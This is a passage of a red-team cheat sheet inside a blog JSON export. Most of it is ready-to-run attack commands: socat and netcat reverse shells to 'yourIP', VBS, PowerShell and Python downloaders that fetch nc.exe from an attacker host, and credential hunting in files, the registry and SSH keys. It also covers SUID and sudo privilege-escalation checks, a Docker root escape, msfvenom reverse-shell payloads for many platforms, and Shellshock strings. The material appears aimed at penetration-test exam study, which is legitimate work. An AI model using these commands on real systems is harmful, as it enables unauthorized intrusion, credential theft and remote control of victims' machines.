with  <code>Xnest :1</code></p>\n<ul>\n<li>socat</li>\n</ul>\n<p>Listener:<br />\n <code>socat file:`tty`,raw,echo=0 yourIP:4444</code></p>\n<p>target:<br />\n <code>socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:yourIP:4444</code></p>\n<h2 id=\"interactive-shell-upgrade-tricks\"><a class=\"anchor\" href=\"#interactive-shell-upgrade-tricks\">#</a> Interactive Shell Upgrade Tricks</h2>\n<ul>\n<li>\n<p>Python (Linux)<br />\n <code>python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)' </code></p>\n</li>\n<li>\n<p>Python (Windows)<br />\n <code>c:\\python26\\python.exe -c 'import pty; pty.spawn(&quot;c:\\\\windows\\\\system32\\\\cmd.exe&quot;)' </code></p>\n</li>\n<li>\n<p>Expect</p>\n</li>\n</ul>\n<p>sh.exp</p>\n<pre><code>#!/usr/bin/expect\nspawn sh\ninteract\n</code></pre>\n<ul>\n<li>Script<br />\n <code>script /dev/null</code></li>\n</ul>\n<h2 id=\"inside-windows\"><a class=\"anchor\" href=\"#inside-windows\">#</a> Inside Windows</h2>\n<ul>\n<li>\n<p>Get version<br />\n <code>systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;</code></p>\n</li>\n<li>\n<p>Get users<br />\n <code>net users</code></p>\n</li>\n<li>\n<p>Get user info<br />\n <code>net user &lt;username&gt;</code></p>\n</li>\n<li>\n<p>Check local connections and listening ports (compare with nmap scan to see if there are any hidden ports)<br />\n <code>netstat -ano</code></p>\n</li>\n<li>\n<p>Firewall status<br />\n <code>netsh firewall show state</code> <br />\n <code>netsh firewall show config</code></p>\n</li>\n<li>\n<p>Scheduled tasks<br />\nList -  <code>schtasks /query /fo LIST /v</code> <br />\nCreate -  <code>schtasks /Create /TN mytask /SC MINUTE /MO 1 /TR &quot;mycommands&quot;</code> <br />\nRun -  <code>schtasks /Run /TN mytask</code> <br />\nDelete -  <code>schtasks /Delete /TN mytask</code></p>\n</li>\n<li>\n<p>Running tasks<br />\nList -  <code>tasklist /SVC</code> <br />\nKill -  <code>taskkill /IM &lt;exe name&gt; /F</code> <br />\nKill -  <code>taskkill /PID &lt;pid&gt; /F</code></p>\n</li>\n<li>\n<p>Services<br />\nList -  <code>net start</code> <br />\nLong name to key name  <code>sc getkeyname &quot;long name&quot;</code> <br />\nDetails -  <code>sc qc &lt;key name&gt;</code> <br />\nConfig -  <code>sc config &lt;key name&gt; </code></p>\n</li>\n<li>\n<p>Low hanging fruits to grab</p>\n</li>\n</ul>\n<pre><code>c:\\sysprep.inf\nc:\\sysprep\\sysprep.xml\n%WINDIR%\\Panther\\Unattend\\Unattended.xml\n%WINDIR%\\Panther\\Unattended.xml\n</code></pre>\n<ul>\n<li>\n<p>Installers are running as elevated?<br />\n <code>reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated</code> <br />\n <code>reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated</code></p>\n</li>\n<li>\n<p>Find interesting files<br />\n <code>dir /s *pass* == *cred* == *vnc* == *.config*</code> <br />\n <code>findstr /si password *.xml *.ini *.txt</code></p>\n</li>\n<li>\n<p>Find interesting registry entries<br />\n <code>reg query HKLM /f password /t REG_SZ /s</code> <br />\n <code>reg query HKCU /f password /t REG_SZ /s</code></p>\n</li>\n<li>\n<p>Permissions<br />\nCheck detail on service -  <code>accesschk.exe /accepteula -ucqv &lt;service name&gt;</code> <br />\nFind modifiable services -  <code>accesschk.exe /accepteula -uwcqv &quot;Authenticated Users&quot; *</code> <br />\n <code>accesschk.exe /accepteula -uwcqv &quot;Users&quot; *</code> <br />\nFolder permissions -  <code>accesschk.exe -dqv &lt;path&gt;</code> <br />\n <code>cacls &lt;path&gt;</code> <br />\n <code>icacls &lt;path\\file</code></p>\n</li>\n<li>\n<p>Qick win on WinXP SP0/1<br />\n <code>sc config upnphost binpath= &quot;C:\\nc.exe -nv yourIP 4444 -e C:\\WINDOWS\\System32\\cmd.exe&quot;</code> <br />\n <code>sc config upnphost obj= &quot;.\\LocalSystem&quot; password= &quot;&quot;</code> <br />\n <code>sc config upnphost depend= &quot;&quot;</code> <br />\n <code>net stop upnphost</code> <br />\n <code>net start upnphost</code></p>\n</li>\n<li>\n<p>Quick wins<br />\n <code>reg query &quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon&quot;</code> <br />\n <code>reg query &quot;HKLM\\SYSTEM\\Current\\ControlSet\\Services\\SNMP&quot;</code> <br />\n <code>reg query&quot; HKCU\\Software\\SimonTatham\\PuTTY\\Sessions&quot;</code> <br />\n <code>reg query &quot;HKCU\\Software\\ORL\\WinVNC3\\Password&quot;</code></p>\n</li>\n<li>\n<p>Download file with VBS</p>\n</li>\n</ul>\n<pre><code>dim xHttp: Set xHttp = createobject(&quot;Microsoft.XMLHTTP&quot;)\ndim bStrm: Set bStrm = createobject(&quot;Adodb.Stream&quot;)\nxHttp.Open &quot;GET&quot;, &quot;http://yourIp/nc.exe&quot;, False\nxHttp.Send\n\nwith bStrm\n    .type = 1 \\'//binary\n    .open\n    .write xHttp.responseBody\n    .savetofile &quot;C:\\\\Users\\\\Public\\\\nc.exe&quot;, 2 \\'//overwrite\nend with\n</code></pre>\n<ul>\n<li>\n<p>Download with Powershell 3+<br />\n <code>powershell -NoLogo -Command &quot;Invoke-WebRequest -Uri 'https://yourIP/nc.exe' -OutFile 'c:\\Users\\Public\\Downloads\\nc.exe'&quot;</code></p>\n</li>\n<li>\n<p>Download with Powershell 2<br />\n <code>powershell -NoLogo -Command &quot;$webClient = new-object System.Net.WebClient; $webClient.DownloadFile('https://yourIP/nc.exe', 'c:\\Users\\Public\\Download\\nc.exe')&quot;</code></p>\n</li>\n<li>\n<p>Download with Python<br />\n <code>c:\\Python26\\python.exe -c &quot;import urllib; a=open('nc.exe', 'wb'); a.write(urllib.urlopen('http://yourIP/nc.exe').read()); a.flush();a.close()&quot; </code></p>\n</li>\n<li>\n<p>Windows specific LPE vulns</p>\n</li>\n</ul>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvMTExOTkv\">https://www.exploit-db.com/exploits/11199/</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvMTgxNzYv\">https://www.exploit-db.com/exploits/18176/</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvMTU2MDkv\">https://www.exploit-db.com/exploits/15609/</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2VjdXJpdHlmb2N1cy5jb20vYmlkLzQyMjY5L2V4cGxvaXQ=\">https://www.securityfocus.com/bid/42269/exploit</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2VjdXJpdHlmb2N1cy5jb20vYmlkLzQ2MTM2L2V4cGxvaXQ=\">https://www.securityfocus.com/bid/46136/exploit</span></li>\n</ul>\n<h2 id=\"inside-linux\"><a class=\"anchor\" href=\"#inside-linux\">#</a> Inside Linux</h2>\n<ul>\n<li>Basic enumeration</li>\n</ul>\n<p>System info<br />\n <code>uname -a</code></p>\n<p>Arch<br />\n <code>uname -m</code></p>\n<p>Kernel<br />\n <code>cat /proc/version\t</code></p>\n<p>Distro<br />\n <code>cat /etc/*-release</code>  or  <code>cat /etc/issue</code></p>\n<p>Filesystem<br />\n <code>df -a\t</code></p>\n<p>Users<br />\n <code>cat /etc/passwd</code></p>\n<p>Groups<br />\n <code>cat /etc/group</code></p>\n<p>Super accounts<br />\n <code>grep -v -E &quot;^#&quot; /etc/passwd | awk -F: '$3 == 0 &#123; print $1&#125;'</code></p>\n<p>Currently logged in<br />\n <code>finger</code> ,  <code>w</code> ,  <code>who -a</code> ,  <code>pinky</code> ,  <code>users</code></p>\n<p>Last logged users<br />\n <code>last</code> ,  <code>lastlog</code></p>\n<p>Cheeky test -<br />\n <code>sudo -l</code></p>\n<p>Anything interesting we can run as sudo?<br />\n <code>sudo -l 2&gt;/dev/null | grep -w 'nmap|perl|awk|find|bash|sh|man|more|less|vi|vim|nc|netcat|python|ruby|lua|irb' | xargs -r ls -la 2&gt;/dev/null</code></p>\n<p>History -<br />\n <code>history</code></p>\n<p>Env vars<br />\n <code>env</code></p>\n<p>Available shells<br />\n <code>cat /etc/shells\t</code></p>\n<p>SUID files<br />\n <code>find / -perm -4000 -type f 2&gt;/dev/null</code></p>\n<p>SUID owned by root<br />\n <code>find / -uid 0 -perm -4000 -type f 2&gt;/dev/null</code></p>\n<p>GUID files<br />\n <code>find / -perm -2000 -type f 2&gt;/dev/null\t</code></p>\n<p>World writable<br />\n <code>find / -perm -2 -type f 2&gt;/dev/null</code></p>\n<p>World writable executed<br />\n <code>find / ! -path &quot;*/proc/*&quot; -perm -2 -type f -print 2&gt;/dev/null\t</code></p>\n<p>World writable dirs<br />\n <code>find / -perm -2 -type d 2&gt;/dev/null</code></p>\n<p>rhost files<br />\n <code>find /home –name *.rhosts -print 2&gt;/dev/null\t</code></p>\n<p>Plan files<br />\n <code>find /home -iname *.plan -exec ls -la &#123;&#125; ; -exec cat &#123;&#125; 2&gt;/dev/null ;\t</code></p>\n<p>hosts.equiv<br />\n <code>find /etc -iname hosts.equiv -exec ls -la &#123;&#125; 2&gt;/dev/null ; -exec cat &#123;&#125; 2&gt;/dev/null ;\t</code></p>\n<p>Can we peek at /root?<br />\n <code>ls -ahlR /root/\t</code></p>\n<p>Find ssh files<br />\n <code>find / -name &quot;id_dsa*&quot; -o -name &quot;id_rsa*&quot; -o -name &quot;known_hosts&quot; -o -name &quot;authorized_hosts&quot; -o -name &quot;authorized_keys&quot; 2&gt;/dev/null |xargs -r ls -la</code></p>\n<p>Inetd<br />\n <code>ls -la /usr/sbin/in.*\t</code></p>\n<p>Grep logs for loot<br />\n <code>grep -l -i pass /var/log/*.log 2&gt;/dev/null\t</code></p>\n<p>What do we have in logs<br />\n <code>find /var/log -type f -exec ls -la &#123;&#125; ; 2&gt;/dev/null\t</code></p>\n<p>Find conf files in /etc<br />\n <code>find /etc/ -maxdepth 1 -name *.conf -type f -exec ls -la &#123;&#125; ; 2&gt;/dev/null\t</code></p>\n<p>as above<br />\n <code>ls -la /etc/*.conf\t</code></p>\n<p>List open files<br />\n <code>lsof -i -n\t</code></p>\n<p>Can we read root mail?<br />\n <code>head /var/mail/root\t</code></p>\n<p>What is running as root?<br />\n <code>ps aux | grep root\t</code></p>\n<p>Lookup paths to running files<br />\n <code>ps aux | awk '&#123;print $11&#125;'|xargs -r ls -la 2&gt;/dev/null |awk '!x[$0]++'</code></p>\n<p>Exports and permissions of NFS<br />\n <code>ls -la /etc/exports 2&gt;/dev/null; cat /etc/exports 2&gt;/dev/null\t</code></p>\n<p>List sched jobs<br />\n <code>ls -la /etc/cron*\t</code></p>\n<p>List open connections (run with sudo/as root for more results)<br />\n <code>lsof -i</code></p>\n<p>Installed pkgs:<br />\n <code>dpkg -l</code>  (debian),  <code>rpm -qa</code>  (RH)</p>\n<p>sudo version?<br />\n <code>sudo -V</code></p>\n<p>Available compilers<br />\n <code>dpkg --list 2&gt;/dev/null| grep compiler |grep -v decompiler 2&gt;/dev/null &amp;&amp; yum list installed 'gcc*' 2&gt;/dev/null| grep gcc 2&gt;/dev/null</code></p>\n<h3 id=\"docker-tips\"><a class=\"anchor\" href=\"#docker-tips\">#</a> Docker tips</h3>\n<p>Since most likely Docker runs as root if you can execute docker commands as unpriviledged user you can very likely use Docker's privs instead.</p>\n<p><code>docker run --rm -it --pid=host --net=host --privileged -v /:/host ubuntu bash</code>  - note that the root folder from host is mounted as  <code>/host</code> . You'll also see all processes running on host and be connected to same NICs.</p>\n<p>You may want to look into escaping UTS and IPC namespacing with  <code>--uts=host --ipc=host</code></p>\n<h3 id=\"upload-files-using-curl-with-webdav\"><a class=\"anchor\" href=\"#upload-files-using-curl-with-webdav\">#</a> Upload files using cUrl with WebDAV</h3>\n<pre><code>curl -T nc.exe http://targetIP/nc.txt\ncurl -X MOVE -v -H &quot;Destination:http://targetIP/nc.exe&quot; http://targetIP/nc.txt\n</code></pre>\n<h2 id=\"msfvenom\"><a class=\"anchor\" href=\"#msfvenom\">#</a> msfvenom</h2>\n<h3 id=\"list-payloads\"><a class=\"anchor\" href=\"#list-payloads\">#</a> List payloads</h3>\n<p>msfvenom -l</p>\n<h3 id=\"binaries\"><a class=\"anchor\" href=\"#binaries\">#</a> Binaries</h3>\n<ul>\n<li>\n<p>Linux<br />\n <code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</code></p>\n</li>\n<li>\n<p>Windows<br />\n <code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe</code></p>\n</li>\n<li>\n<p>Mac<br />\n <code>msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.macho</code></p>\n</li>\n</ul>\n<h3 id=\"web-payloads\"><a class=\"anchor\" href=\"#web-payloads\">#</a> Web Payloads</h3>\n<ul>\n<li>\n<p>PHP<br />\n <code>msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php</code> <br />\n <code>cat shell.php | pbcopy &amp;&amp; echo '&lt;?php ' | tr -d '\\n' &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</code></p>\n</li>\n<li>\n<p>ASP<br />\n <code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp</code></p>\n</li>\n<li>\n<p>JSP<br />\n <code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp</code></p>\n</li>\n<li>\n<p>WAR<br />\n <code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.war</code></p>\n</li>\n</ul>\n<h3 id=\"scripting-payloads\"><a class=\"anchor\" href=\"#scripting-payloads\">#</a> Scripting Payloads</h3>\n<ul>\n<li>\n<p>Python<br />\n <code>msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py</code></p>\n</li>\n<li>\n<p>Bash<br />\n <code>msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh</code></p>\n</li>\n<li>\n<p>Perl<br />\n <code>msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl</code></p>\n</li>\n</ul>\n<h3 id=\"shellcode\"><a class=\"anchor\" href=\"#shellcode\">#</a> Shellcode</h3>\n<p>For all shellcode see  <code>msfvenom –help-formats</code>  for information as to valid parameters. Msfvenom will output code that is able to be cut and pasted in this language for your exploits.</p>\n<ul>\n<li>\n<p>Linux Based Shellcode<br />\n <code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</code></p>\n</li>\n<li>\n<p>Windows Based Shellcode<br />\n <code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</code></p>\n</li>\n<li>\n<p>Mac Based Shellcode<br />\n <code>msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</code></p>\n</li>\n</ul>\n<h2 id=\"shellshock\"><a class=\"anchor\" href=\"#shellshock\">#</a> Shellshock</h2>\n<ul>\n<li>\n<p>CVE-2014-6271<br />\n <code>env X='() &#123; :; &#125;; echo &quot;CVE-2014-6271 vulnerable&quot;' bash -c id</code></p>\n</li>\n<li>\n<p>CVE-2014-7169<br />\n <code>env X='() &#123; (a)=&gt;\\' bash -c &quot;echo date&quot;; cat echo</code></p>\n</li>\n<li>\n<p>CVE-2014-7186<br />\n <code>bash -c 'true &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF' || echo &quot;CVE-2014-7186 vulnerable, redir_stack&quot;</code></p>\n</li>\n<li>\n<p>CVE-2014-7187<br />\n <code>(for x in &#123;1..200&#125; ; do echo &quot;for x$x in ; do :&quot;; done; for x in &#123;1..200&#125; ; do echo done ; done) | bash || echo &quot;CVE-2014-7187 vulnerable, word_lineno&quot;</code></p>\n</li>\n<li>\n<p>CVE-2014-6278<br />\n <code>env X='() &#123; _; &#125; &gt;_[$($())] &#123; echo CVE-2014-6278 vulnerable; id; &#125;' bash -c :</code></p>\n</li>\n</ul>\n<h2 id=\"references\"><a class=\"anchor\" href=\"#references\">#</a> References</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zdXBwb3J0Lm9mZmVuc2l2ZS1zZWN1cml0eS5jb20vIyFvc2NwLWV4YW0tZ3VpZGUubWQ=\">OSCP Exam Guide</span> - MUST read!</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2JpdHZpamF5cy5naXRodWIuaW8v\">The Magic of Learning</span> - a real treasure trove!</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5mdXp6eXNlY3VyaXR5LmNvbQ==\">FuzzySecurity</span> - this is something you must bookmark... period. I found the <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5mdXp6eXNlY3VyaXR5LmNvbS90dXRvcmlhbHMvMTYuaHRtbA==\">Windows Privilege Escalation Fundamentals</span> especially useful.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY29tcHV0ZXJob3BlLmNvbS93bWljLmh0bQ==\">WMIC reference/guide</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vZW4tdXMvc3lzaW50ZXJuYWxzLw==\">SysInternals</span> - this is a must have for working on Windows boxes.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1Bvd2VyU2hlbGxNYWZpYS9Qb3dlclNwbG9pdA==\">PowerSploit</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5ncmV5aGF0aGFja2VyLm5ldC8/cD03Mzg=\">Elevating privileges by exploiting weak folder permissions</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5jYXJuYWwwd25hZ2UuY29tL3BhcGVycy9MQVJFUy1Db2xkRnVzaW9uLnBkZg==\">ColdFusion for PenTesters</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5nbnVjaXRpemVuLm9yZy9ibG9nL2NvbGRmdXNpb24tZGlyZWN0b3J5LXRyYXZlcnNhbC1mYXEtY3ZlLTIwMTAtMjg2MS8=\">ColdFusion Path Traversal</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9oaWdob24uY29mZmVlL2Jsb2cvcGVuZXRyYXRpb24tdGVzdGluZy10b29scy1jaGVhdC1zaGVldC8=\">Penetration Testing Tools Cheat Sheet</span> - Good read. Check out other cheat sheets on this page too!</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2t1cm9iZWF0cy9maW1hcA==\">fimap</span> - LFI/RFI scanner</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3p0Z3JhY2UvY2hhbmdlbWU=\">Changeme</span> - default password scanner</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jaXJ0Lm5ldC9wYXNzd29yZHM=\">CIRT Default Passwords DB</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3Jlc291cmNlcy5pbmZvc2VjaW5zdGl0dXRlLmNvbS9sb2NhbC1maWxlLWluY2x1c2lvbi1jb2RlLWV4ZWN1dGlvbg==\">From LFI to Shell</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9oaWdob24uY29mZmVlL2Jsb2cvbGludXgtY29tbWFuZHMtY2hlYXQtc2hlZXQv\">Useful Linux commands</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucmVib290dXNlci5jb20vP3A9MTYyMw==\">Local Linux Enumeration</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9uZXRzZWMud3MvP3A9MzMx\">Creating Metasploid Payloads</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL211Yml4L3NoZWxsc2hvY2tlci1wb2Nz\">Shellshock PoCs</span></li>\n</ul>\n",
            "tags": [
                "网络安全",
                "RedTeam"
            ]
        }
    ]
}